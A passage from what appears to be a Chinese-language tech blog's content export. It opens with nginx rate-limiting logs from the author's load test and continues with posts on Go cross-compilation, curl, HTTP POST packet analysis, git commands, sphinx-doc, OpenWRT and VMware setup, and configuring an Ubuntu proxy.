11868#8704: *587 limiting requests, excess: 2.986 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *588 limiting requests, excess: 2.985 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *589 limiting requests, excess: 2.985 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *591 limiting requests, excess: 2.985 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *590 limiting requests, excess: 2.985 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *592 limiting requests, excess: 2.985 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *593 limiting requests, excess: 2.985 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *594 limiting requests, excess: 2.985 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *595 limiting requests, excess: 2.985 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *597 limiting requests, excess: 2.984 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *596 limiting requests, excess: 2.984 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *598 limiting requests, excess: 2.984 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *599 limiting requests, excess: 2.984 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *600 limiting requests, excess: 2.984 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *601 limiting requests, excess: 2.984 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *602 limiting requests, excess: 2.983 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *603 limiting requests, excess: 2.983 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *604 limiting requests, excess: 2.983 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *605 limiting requests, excess: 2.983 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *607 limiting requests, excess: 2.983 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *606 limiting requests, excess: 2.983 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *608 limiting requests, excess: 2.983 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *609 limiting requests, excess: 2.983 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *610 limiting requests, excess: 2.982 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *611 limiting requests, excess: 2.982 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *612 limiting requests, excess: 2.982 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *614 limiting requests, excess: 2.982 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *613 limiting requests, excess: 2.982 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *615 limiting requests, excess: 2.982 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *616 limiting requests, excess: 2.981 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *617 limiting requests, excess: 2.981 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *618 limiting requests, excess: 2.981 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *619 limiting requests, excess: 2.981 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *620 limiting requests, excess: 2.980 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *621 limiting requests, excess: 2.980 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *622 limiting requests, excess: 2.979 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *624 limiting requests, excess: 2.979 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *623 limiting requests, excess: 2.979 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *628 limiting requests, excess: 2.979 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *626 limiting requests, excess: 2.979 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *627 limiting requests, excess: 2.979 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *625 limiting requests, excess: 2.979 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *629 limiting requests, excess: 2.979 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *630 limiting requests, excess: 2.978 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *631 limiting requests, excess: 2.978 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *632 limiting requests, excess: 2.978 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *635 limiting requests, excess: 2.978 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *634 limiting requests, excess: 2.978 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *633 limiting requests, excess: 2.978 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *637 limiting requests, excess: 2.977 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *636 limiting requests, excess: 2.977 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *638 limiting requests, excess: 2.977 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *640 limiting requests, excess: 2.977 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *639 limiting requests, excess: 2.977 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *641 limiting requests, excess: 2.976 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *642 limiting requests, excess: 2.976 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *643 limiting requests, excess: 2.975 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *645 limiting requests, excess: 2.975 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *644 limiting requests, excess: 2.975 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[{"name":"nginx,ab","slug":"nginx-ab","permalink":"http://yoursite.com/tags/nginx-ab/"}]},{"title":"Golang交叉编译","slug":"Golang/Golang交叉编译","date":"2019-07-24T11:58:28.000Z","updated":"2019-07-24T11:58:28.000Z","comments":true,"path":"Golang/Golang交叉编译/","link":"","permalink":"http://yoursite.com/Golang/Golang交叉编译/","excerpt":"","text":"本文以Windows平台下编译Linux应用举例，记录一下Golang交叉编译。 12345678# helpgo get：获取远程包（需 提前安装 git或hg）go run：直接运行程序go build：测试编译，检查是否有编译错误go fmt：格式化源码（部分IDE在保存时自动调用）go install：编译包文件并编译整个程序go test：运行测试文件go doc：查看文档（CHM手册） 一、设置环境变量12$ set GOARCH=amd64$ set GOOS=linux 在终端CMD输入没用，我直接在环境变量设置了 GOARCH 和 GOOS 。这样就无法在Windows运行，因为 go run 的也是指linux平台。 二、编译1$ go build xx.go 三、依赖错误编译的时候，出现 unrecognized import path &quot;golang.org/x/sys/unix&quot; 错误，本来就是下载依赖库网络超时，但科学上网也没有解决。 在Ubuntu下编译也会出现这个错误 详细错误信息：123456Fetching https://golang.org/x/sys/unix?go-get=1https fetch failed: Get https://golang.org/x/sys/unix?go-get=1: dial tcp 216.239.37.1:443: i/o timeoutpackage golang.org/x/sys/unix: unrecognized import path \"golang.org/x/sys/unix\" (https fetch: Get https://golang.org/x/sys/unix?go-get=1: dial tcp 216.239.37.1:443: i/o timeout) 解决办法： 通过手动下载Github上的3个依赖项目到 $GOPATH/src/golang.org/x/ 目录 github.com/golang/net.git github.com/golang/sys.git github.com/golang/tools.git 以下是在Linux的操作日志(Windows也是通过的办法)：12345678910111213141516171819202122232425root@ubuntu:~/golangworks/src$ mkdir -p $GOPATH/src/golang.org/x/root@ubuntu:~/golangworks/src$ cd !$cd $GOPATH/src/golang.org/x/root@ubuntu:~/golangworks/src/golang.org/x$ git clone https://github.com/golang/net.gitCloning into 'net'...remote: Enumerating objects: 4, done.remote: Counting objects: 100% (4/4), done.remote: Compressing objects: 100% (4/4), done.remote: Total 8766 (delta 0), reused 1 (delta 0), pack-reused 8762Receiving objects: 100% (8766/8766), 6.77 MiB | 601.00 KiB/s, done.Resolving deltas: 100% (6184/6184), done.root@ubuntu:~/golangworks/src/golang.org/x$ git clone https://github.com/golang/sys.gitCloning into 'sys'...remote: Enumerating objects: 8003, done.remote: Total 8003 (delta 0), reused 0 (delta 0), pack-reused 8003Receiving objects: 100% (8003/8003), 6.28 MiB | 554.00 KiB/s, done.Resolving deltas: 100% (6884/6884), done.root@ubuntu:~/golangworks/src/golang.org/x$ git clone https://github.com/golang/tools.gitCloning into 'tools'...remote: Enumerating objects: 6, done.remote: Counting objects: 100% (6/6), done.remote: Compressing objects: 100% (6/6), done.remote: Total 29602 (delta 0), reused 1 (delta 0), pack-reused 29596Receiving objects: 100% (29602/29602), 13.76 MiB | 1.29 MiB/s, done.Resolving deltas: 100% (20632/20632), done. 四、平台1.GOOS：目标平台的操作系统 windows linux darwin (MacOX) freebsd 2.GOARCH：目标平台的体系架构 386 (32位x86) amd64 (64位x86) arm","categories":[{"name":"Golang","slug":"Golang","permalink":"http://yoursite.com/categories/Golang/"}],"tags":[]},{"title":"Curl命令备忘","slug":"前端/Curl命令备忘","date":"2019-07-23T11:52:36.000Z","updated":"2021-12-28T03:24:10.245Z","comments":true,"path":"前端/Curl命令备忘/","link":"","permalink":"http://yoursite.com/前端/Curl命令备忘/","excerpt":"","text":"打印HTTP包信息12$ curl -v URL$ curl --verbose URL 1234567891011121314$ curl -v -X POST http://localhost/ping&gt; POST /ping HTTP/1.1&gt; Host: localhost&gt; User-Agent: curl/7.47.0&gt; Accept: */*&gt; &lt; HTTP/1.1 200 &lt; Server: nginx&lt; Date: Tue, 23 Jul 2019 04:07:18 GMT&lt; Content-Type: text/plain;charset=UTF-8&lt; Content-Length: 5&lt; Connection: keep-alive&lt; PONG","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[{"name":"Curl","slug":"Curl","permalink":"http://yoursite.com/tags/Curl/"}]},{"title":"深入解析HTTP--POST请求","slug":"前端/深入解析HTTP--POST请求","date":"2019-07-20T11:52:36.000Z","updated":"2021-12-28T03:24:10.260Z","comments":true,"path":"前端/深入解析HTTP--POST请求/","link":"","permalink":"http://yoursite.com/前端/深入解析HTTP--POST请求/","excerpt":"","text":"之前写的《深入解析HTTP–Chunk分块发送》 和 《深入解析HTTP–Multipart》 都是关于用POST请求上传文件，本文要讲的，是指POST请求传递字符数据。 我们用PostMan作为客户端，SpringBoot作为服务端，Wireshark抓包，分析一下每个请求的包结构，了解一下其中的区别。 一、最简单的传参服务端代码：12345@PostMapping(\"/post\")public ResponseEntity testpost(@RequestParam(\"name\") String name)&#123; return ResponseEntity.ok(\"ok:\"+name);&#125; postman上有两种方式可以完成这个请求： URL中带参数这样的请求就相当于GET请求了，从下面的请求抓包也可以看出，基本和GET请求一样，要注意的是参数如果有中文等则需要编码。 网络抓包 12345678910POST /post?name=kevin HTTP/1.1Host: 192.168.0.223:8080content-length: 0HTTP/1.1 200 Content-Type: text/plain;charset=UTF-8Content-Length: 8Date: Sat, 20 Jul 2019 04:37:55 GMTok:kevin Body中带参数(application/x-www-form-urlencoded)客户端要在Header加 Content-Type: application/x-www-form-urlencoded 网络抓包 123456789101112POST /post HTTP/1.1Host: 192.168.0.223:8080Content-Type: application/x-www-form-urlencodedcontent-length: 9Connection: keep-alivename=evalHTTP/1.1 200 Content-Type: text/plain;charset=UTF-8Content-Length: 7Date: Sat, 20 Jul 2019 04:39:53 GMTok:eval 注意：请求体的Body之后没有换行符（/r/n），所以抓包的响应体HTTP/1.1 200没有换行 个人觉得，POST的数据就应该放在Body里面，如本例子，本例子Body体的参数带有中文也是没有问题的。 二、发送文本服务端代码12345@PostMapping(\"/post/txt\")public ResponseEntity testPostText(@RequestBody() String body)&#123; return ResponseEntity.ok(\"body:\"+body);&#125; 客户端发送文本要在Header加 Content-Type: text/plain 请求响应 网络抓包 123456789101112POST /post/txt HTTP/1.1Host: 192.168.0.223:8080Content-Type: text/plaincontent-length: 6Connection: keep-alive......HTTP/1.1 200 Content-Type: text/plain;charset=UTF-8Content-Length: 11Date: Sat, 20 Jul 2019 08:59:44 GMTbody:...... ......是中文字符 “你好” 三、发送JSON服务端代码12345@PostMapping(\"/post/json\")public ResponseEntity testPostText(@RequestBody() Object object)&#123; return ResponseEntity.ok(object);&#125; 客户端发送JSON要在Header加 Content-Type: application/json 请求响应 网络抓包 123456789101112POST /post/json HTTP/1.1Content-Type: application/jsonHost: 192.168.0.223:8080content-length: 29Connection: keep-alive&#123;&quot;name&quot;: &quot;json&quot;, &quot;age&quot;:&quot;222&quot;&#125;HTTP/1.1 200 Content-Type: application/json;charset=UTF-8Transfer-Encoding: chunkedDate: Sat, 20 Jul 2019 09:24:02 GMT&#123;&quot;name&quot;:&quot;json&quot;,&quot;age&quot;:&quot;222&quot;&#125;","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[]},{"title":"Git常用命令备忘","slug":"git/Git命令备忘","date":"2019-07-20T04:26:36.000Z","updated":"2019-07-20T04:26:36.000Z","comments":true,"path":"git/Git命令备忘/","link":"","permalink":"http://yoursite.com/git/Git命令备忘/","excerpt":"","text":"暂存会有这么一个场景，现在你正在用你的 feature 分支上开发新功能。这时，生产环境上出现了一个 bug 需要紧急修复，但是你这部分代码还没开发完，不想提交，怎么办？这个时候可以用 git stash命令先把工作区已经修改的文件暂存起来，然后切换到 hotfix 分支上进行 bug 的修复，修复完成后，切换回 feature 分支，从堆栈中恢复刚刚保存的内容。 12345678git stash //把本地的改动暂存起来git stash save \"message\" 执行存储时，添加备注，方便查找。git stash pop // 应用最近一次暂存的修改，并删除暂存的记录git stash apply // 应用某个存储,但不会把存储从存储列表中删除，默认使用第一个存储,即stash@&#123;0&#125;，如果要使用其他个，git stash apply stash@&#123;$num&#125; 。git stash list // 查看stash有哪些存储git stash clear // 删除所有缓存的stash 快速提交12# 等同于 git add . &amp;&amp; git commit -mgit commit -am 修改最后一次提交message有些时候不小心 git commit -m ‘提交信息’ 中的 “提交信息” 写错了，可以执行命令修改： 1$ git commit --amend -m \"新的修改提交信息\" 注意：只能修改最后一次commit 。 取消跟踪文件比如，创建仓库的时候 .gitignore 没写好，把 .idea/ 的文件也加到仓库中，现在不想继续跟踪 .idea/ 里面的文件，那么，执行以下命令，删除跟踪文件，保留本地的文件。1$ git rm -r --cached .idea/ 拉取远程分支clone 命令默认是克隆master分支，那么要拉取其他分支，用以下方法123git clone git@github.com:gege/demo.gitgit fetch origin devgit checkout dev 合并1$ git merge develop --no-ff -m 'merge develop into master' –no-ff 可以保存分支历史，能够更好的查看 merge 历史，以及 branch 状态。 撤销修改假如我修改了文件 readme.txt，并没有add 和 commit ，但是对这次的修改搞到不满意，想还原到修改之前的状态（将文件在工作区的修改全部撤销）。 1$ git checkout -- readme.txt 注意：如果已经add，并且再次做了修改，那么上面的命令可以恢复到add时的状态 撤销commit假如提交了一次commit，马上就发现有问题，或者我想重新commit一次，修改 -m &#39;xx&#39; 的内容，可以恢复到执行commit之前的状态。 查询提交历史12345678910$ git logcommit 9ff40a7f902eeb7dd75a277246f3cd2c5b73e8de (HEAD -&gt; reload)Date: Sat Jul 20 12:01:53 2019 +0800 这是一次错误的提交commit af57771d43deb47aff5d0dd16337b77634200072 (origin/reload)Date: Fri Jul 19 22:46:30 2019 +0800 Fix BUG 其中，9ff40a7f902eeb7dd75a277246f3cd2c5b73e8de是最新的一次提交，也就是错误commit。而 af57771d43deb47aff5d0dd16337b77634200072 是上次的commit，我们就恢复到这个commit，记得加上 --mixed 参数。 1$ git reset af57771d43deb47aff5d0dd16337b77634200072 --mixed 执行完之后，文件内容都没变，只是状态改变了（Untracked），使用 &quot;git add&quot; and/or &quot;git commit -a&quot;) 重新提交即可。","categories":[{"name":"git","slug":"git","permalink":"http://yoursite.com/categories/git/"}],"tags":[{"name":"Git,命令,备忘","slug":"Git-命令-备忘","permalink":"http://yoursite.com/tags/Git-命令-备忘/"}]},{"title":"网站文档sphinx-doc","slug":"docs文档工具/网站文档sphinx-doc","date":"2019-07-13T01:55:36.000Z","updated":"2019-07-13T01:55:36.000Z","comments":true,"path":"docs文档工具/网站文档sphinx-doc/","link":"","permalink":"http://yoursite.com/docs文档工具/网站文档sphinx-doc/","excerpt":"","text":"预览【sphinx_rtd_theme】主题 自带的sphinx主题 简介【sphinx-doc】是基于python的文档生成器（使用文档推荐【这个】），它使用 reStructuredText 语法(类似markdown)编写文档，通过编译，可以生成html,epub,man,pdf等多种格式，现在也可以通过安装扩展来支持简单的Markdown语法。 安装 Ubuntupython3-sphinx (Python 3) 或者 python-sphinx (Python 2) 1$ apt-get install python3-sphinx macOS 1$ brew install sphinx-doc Windows 1$ pip install -U sphinx 创建项目123456789101112131415# 新建空项目$ sphinx-quickstart# 需要做很多的配置，完成之后目录结构如下：.├── _build├── conf.py├── index.rst├── make.bat├── Makefile├── _static└── _templates3 directories, 4 files# 编译为html$ make html 支持Markdown【教程】【官网教程】 1$ pip install recommonmark conf.py 加入1extensions = ['recommonmark'] 警告：Markdown不支持Sphinx的很多特性，比如内联标记和指令 主题介绍一个主题【sphinx_rtd_theme】 它是【readthedocs.org】做的一个主题，这个网站本身提供 创建、托管和浏览文档 ，比如它提供的【sphinx文档】比 【sphinx官网】 的好看多了。 【sphinx-rtd-theme的文档】 安装主题1$ pip install sphinx_rtd_theme conf.py 配置1html_theme = &quot;sphinx_rtd_theme&quot; 【更多主题配置】","categories":[{"name":"docs文档工具","slug":"docs文档工具","permalink":"http://yoursite.com/categories/docs文档工具/"}],"tags":[{"name":"文档,sphinx","slug":"文档-sphinx","permalink":"http://yoursite.com/tags/文档-sphinx/"}]},{"title":"VMware安装OpenWRT","slug":"虚拟化技术&云平台/VMware安装OpenWRT","date":"2019-07-13T01:52:36.000Z","updated":"2019-07-13T01:52:36.000Z","comments":true,"path":"虚拟化技术&云平台/VMware安装OpenWRT/","link":"","permalink":"http://yoursite.com/虚拟化技术&云平台/VMware安装OpenWRT/","excerpt":"","text":"VMware上安装OpenWRT的方法很多种，推荐： 通过源码编译vmdk磁盘文件，【教程】。 通过下载官方的img镜像，转换为vmdk磁盘文件，【教程】。 直接下载vm镜像，开箱即用，但是安全性不高，【教程】。 我比较懒，就用开箱即用试了一下。 【下载地址】下载了一个，解压之后只要一个VM的配置文件和VM磁盘文件。用VM打开，启动提示其他版本VM创建，修改配置文件，把 virtualHW.version的值改为自己的版本，重新启动。 1$ ifconfig -a 看到它的IP是 192.168.0.120,在浏览器访问，就能看到OpenWRT的Web登录界面。默认登录账号是 root，密码不知道。 直接在虚拟机终端修改root的密码:1$ passwd root 重新登录Web","categories":[{"name":"虚拟化技术&云平台","slug":"虚拟化技术-云平台","permalink":"http://yoursite.com/categories/虚拟化技术-云平台/"}],"tags":[{"name":"VMWare,OpenWRT","slug":"VMWare-OpenWRT","permalink":"http://yoursite.com/tags/VMWare-OpenWRT/"}]},{"title":"VMWare资源配置","slug":"虚拟化技术&云平台/VMWare资源配置","date":"2019-07-12T01:52:36.000Z","updated":"2019-07-12T01:52:36.000Z","comments":true,"path":"虚拟化技术&云平台/VMWare资源配置/","link":"","permalink":"http://yoursite.com/虚拟化技术&云平台/VMWare资源配置/","excerpt":"","text":"现在普通的CPU都是有4核，在VM中如何配置虚拟机的CPU呢？ 个人推荐是 CPU数量 * 核心 = X倍的内存 2个CPU * 每个CPU2核 = 4核 ，这时候最好给8G以上内存。 比如：","categories":[{"name":"虚拟化技术&云平台","slug":"虚拟化技术-云平台","permalink":"http://yoursite.com/categories/虚拟化技术-云平台/"}],"tags":[{"name":"VMWare","slug":"VMWare","permalink":"http://yoursite.com/tags/VMWare/"}]},{"title":"Ubuntu设置系统代理网络上网","slug":"Linux/Ubuntu设置系统代理网络上网","date":"2019-07-11T13:52:36.000Z","updated":"2019-07-11T13:52:36.000Z","comments":true,"path":"Linux/Ubuntu设置系统代理网络上网/","link":"","permalink":"http://yoursite.com/Linux/Ubuntu设置系统代理网络上网/","excerpt":"","text":"VMWare中的Ubuntu系统有时候需要发行代币之类的工作，这时候就需要科学上网，Linux下的VxN客户端软件都做的不太好，这时候可以通过设置Linux系统的“网络代理”来使用宿主机的网络来访问网络。 环境宿主机：Win10（安装了VxN）虚拟机：Ubuntu 18.04 设置VMWare和虚拟机Ubuntu的网络 VM虚拟机网络模式 桥接模式 ，虚拟机和宿主机是同一个网段，我采用这个模式，宿主机IP是 192.168.0.30 ； Nat模式 ，在Win10的 网络适配器 或者 ipconfig -all 命令 找到 VMware Network Adapter VMnet8 的IP（这个是Nat网宿主机的IP），此模式下宿主机IP一般是 192.168.x.1 。 打开Ubuntu网络设置 设置Ubuntu网络代理（设置为宿主机IP：192.168.0.30）这里的IP指宿主机的IP，端口是指宿主机的VxN的端口，如宿主机上VxN的设置：这样就设置完成了，重启一下Ubuntu的网络，用浏览器访问一下网络，如果还是不能访问，重启一下Ubuntu。 测试终端的网络 用Ping测试是不行的，这跟Ping的协议有关。 12345samwen@sam-ubuntu:~$ ping www.google.comPING www.google.com (205.186.152.122) 56(84) bytes of data.^C--- www.google.com ping statistics ---18 packets transmitted, 0 received, 100% packet loss, time 17403ms 用wget来测试HTTP网络 12345678910samwen@sam-ubuntu:~$ wget www.google.com--2019-07-11 16:00:53-- http://www.google.com/Connecting to 192.168.0.30:1080... 